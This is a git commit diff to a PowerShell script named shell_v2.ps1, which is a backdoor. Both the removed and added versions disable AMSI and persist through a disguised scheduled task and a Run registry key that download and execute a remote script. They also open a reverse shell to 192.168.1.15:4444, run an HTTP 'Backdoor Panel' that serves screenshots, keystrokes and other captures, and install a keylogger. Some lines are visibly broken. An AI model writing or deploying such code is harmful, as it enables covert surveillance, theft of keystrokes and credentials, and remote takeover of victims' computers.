b6ae85dee7b0a5809cb7ac11c137d98e2c58badf
B15cu1t <141248562+B15cu1t@users.noreply.github.com>
2026-03-17 21:19:16 +0100

    Update shell_v2.ps1

--- shell_v2.ps1
+++ shell_v2.ps1
@@ -1,38 +1,58 @@
-$null = [Ref].Assembly.GetTypes();[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-[Ref].Assembly.GetType('System.Management.Automation.TypeAccelerators').GetField('m_typeAccelerators','NonPublic,Static').SetValue($null,@{})
-$code = "[DllImport(`"kernel32.dll`")]public static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string);";$t=[Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...')).GetType('ConfuserEx2.Class1');$t.GetMethod('ConfuserEx2').Invoke($null,$null);
+powershell -nop -w hidden -c "
+try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}
 
-$taskname = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("WindowsUpdateCheck")) | ForEach {[char]($_-bxor 0x5F)};
-$taskxml = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd><AllowStartOnDemand>true</AllowStartOnDemand></Settings>
-  <Triggers><BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger></Triggers>
-  <Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_C2_IP/shell.ps1');Start-Sleep 60;IEX \$sl"</Arguments></Exec></Actions>
-</Task>
-"@
-$null = schtasks /create /tn $taskname /xml $taskxml /f 2>$null
-$regpath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\WindowsTelemetry';New-Item -Path $regpath -Force | Out-Null;Set-ItemProperty -Path $regpath -Name '(default)' -Value "powershell -w h -nop -c `"IEX ((New-Object Net.WebClient).DownloadString('http://YOUR_C2_IP/shell.ps1'))`"" -Force
+`$taskcmd = 'powershell -nop -w hidden -c `"&{IEX((New-Object Net.WebClient).DownloadString(`'http://192.168.1.15/shell.ps1`'))}`"';
+schtasks /create /tn 'WindowsUpdateCheck' /tr `$taskcmd /sc onlogon /rl highest /f 2>`$null;
+Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsTelemetry' -Value `$taskcmd -Force 2>`$null;
 
-$etwpatch = @"
-using System; using System.Runtime.InteropServices; public class EtwDisable { [DllImport("ntdll.dll")] public static extern uint EtwEventWrite(); public static void Patch() { var addr = (ulong)EtwEventWrite; Marshal.Copy(new byte[] {0x48,0xC7,0xC0}, 0, (IntPtr)(addr+9), 4); } }
-"@;[Reflection.Assembly]::Load([Convert]::FromBase64String('...')).GetType('EtwDisable').GetMethod('Patch').Invoke($null,$null)
+Start-Job -ScriptBlock {
+    while (`$true) {
+        try {
+            `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15',4444);
+            `$stream = `$client.GetStream(); [byte[]]`$bytes = 0..65535|%{0};
+            while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0) {
+                `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);
+                `$sendback = (iex `$data 2>&1 | Out-String );
+                `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';
+                `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);
+                `$stream.Write(`$sendbyte,0,`$sendbyte.Length); `$stream.Flush();
+            }; `$client.Close()
+        } catch { Start-Sleep 5 }
+    }
+}
 
-$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+Start-Job -ScriptBlock {
+    `$listener = New-Object System.Net.HttpListener; `$listener.Prefixes.Add('http://*:8080/'); `$listener.Start();
+    `$html = '<html><body><h1>Backdoor Panel</h1><a href=/webcam>Webcam</a> <a href=/screen>Screen</a> <a href=/keys>Keys</a></body></html>';
+    while (`$listener.IsListening) {
+        try {
+            `$ctx = `$listener.GetContext(); `$req = `$ctx.Request; `$res = `$ctx.Response;
+            switch(`$req.Url.AbsolutePath) {
+                '/' { `$buf = [Text.Encoding]::UTF8.GetBytes(`$html); `$res.ContentLength64 = `$buf.Length; `$res.OutputStream.Write(`$buf,0,`$buf.Length) }
+                '/screen' { 
+                    Add-Type -AssemblyName System.Drawing;
+                    `$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
+                    `$bmp = New-Object System.Drawing.Bitmap(`$bounds.Width, `$bounds.Height);
+                    `$g = [System.Drawing.Graphics]::FromImage(`$bmp);
+                    `$g.CopyFromScreen(`$bounds.Location, [System.Drawing.Point]::Empty, `$bounds.Size);
+                    `$mem = New-Object System.IO.MemoryStream; `$bmp.Save(`$mem, [System.Drawing.Imaging.ImageFormat]::Jpeg);
+                    `$res.ContentType = 'image/jpeg'; `$res.ContentLength64 = `$mem.Length; `$mem.WriteTo(`$res.OutputStream);
+                }
+                '/keys' { `$log = 'C:\temp\keys.txt' -ne (Test-Path) ? 'No keys yet' : (Get-Content `$log -Raw); `$buf = [Text.Encoding]::UTF8.GetBytes(`$log); `$res.OutputStream.Write(`$buf,0,`$buf.Length) }
+            }
+            `$res.Close()
+        } catch { }
+    }
+}
 
-$listener = New-Object System.Net.HttpListener; $listener.Prefixes.Add("http://*:8080/"); $listener.Start(); $html = @"
-<!DOCTYPE html><html><body><h1>Backdoor Control Panel</h1>
-<a href="/webcam"><button>Webcam Snap</button></a> <a href="/mic"><button>Mic Record</button></a> <a href="/screen"><button>Screenshot</button></a> <a href="/keys"><button>Keylog Dump</button></a> <a href="/files"><button>Dir List</button></a>
-</body></html>
-"@
-while ($listener.IsListening) { $context = $listener.GetContext(); $req = $context.Request; $res = $context.Response; $res.ContentType = "text/html"; switch($req.Url.AbsolutePath) {
-    "/" { $buf = [Text.Encoding]::UTF8.GetBytes($html); $res.ContentLength64 = $buf.Length; $res.OutputStream.Write($buf,0,$buf.Length) }
-    "/webcam" { Add-Type -AssemblyName System.Drawing; $cam = New-Object -ComObject WIA.CommonDialog; $img = $cam.ShowAcquireImage(); $img.SaveFile("C:\temp\cam.jpg"); $buf = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\cam.jpg")); $res.ContentType="image/jpeg"; $res.OutputStream.Write([Convert]::FromBase64String($buf),0,$buf.Length) }
-    "/mic" { Add-Type -Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Speech.dll"; $sr = New-Object System.Speech.Recognition.SpeechRecognitionEngine; $sr.SetInputToDefaultAudioDevice(); $sr.RecognizeAsync([System.Speech.Recognition.RecognizeMode]::Multiple); Start-Sleep 10; $audio = [IO.File]::ReadAllBytes("C:\temp\mic.wav"); $res.ContentType="audio/wav"; $res.OutputStream.Write($audio,0,$audio.Length) }
-    "/screen" { Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save("C:\temp\screen.jpg",[System.Drawing.Imaging.ImageFormat]::Jpeg); $buf = [IO.File]::ReadAllBytes("C:\temp\screen.jpg"); $res.ContentType="image/jpeg"; $res.OutputStream.Write($buf,0,$buf.Length) }
-    "/keys" { $log = Get-Content "C:\temp\keys.txt" -ErrorAction SilentlyContinue; $buf = [Text.Encoding]::UTF8.GetBytes($log); $res.OutputStream.Write($buf,0,$buf.Length) }
-    "/files" { $files = Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Out-String; $buf = [Text.Encoding]::UTF8.GetBytes($files); $res.OutputStream.Write($buf,0,$buf.Length) }
-}; $res.Close() }
+mkdir C:\temp -Force 2>`$null; Start-Job -ScriptBlock {
+    Add-Type @'
+    using System; using System.Runtime.InteropServices; using System.IO;
+    public class KL { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+        public static void Log() { while(true) { for(int i=8;i<=255;i++) { if(GetAsyncKeyState(i)==-32767) File.AppendAllText(@"C:\temp\keys.txt", ((char)i).ToString()); } System.Threading.Thread.Sleep(10); } }
+    }
+'@; [KL]::Log()
+}
 
-$logfile = "C:\temp\keys.txt"; while($true) { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Keylogger { [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); public static void Hook() { while(true) { for(int i=0;i<255;i++) { if(GetAsyncKeyState(i)==-32767) { File.AppendAllText("C:\temp\keys.txt",((char)i).ToString()); } } Thread.Sleep(10); } } }'; [Keylogger]::Hook() }
+Write-Host 'Backdoor deployed' -f green; Start-Sleep 9999
+"
